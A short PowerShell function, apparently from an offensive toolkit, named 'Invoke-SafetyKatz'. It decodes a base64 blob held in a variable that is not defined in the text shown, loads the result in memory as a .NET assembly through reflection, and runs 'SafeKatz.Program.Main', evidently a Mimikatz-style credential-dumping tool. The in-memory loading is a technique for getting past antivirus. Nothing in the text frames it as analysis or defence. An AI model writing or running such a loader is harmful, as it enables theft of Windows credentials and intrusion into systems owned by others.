function Invoke-SafetyKatz
{   
   $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
   [SafeKatz.Program]::Main("")
}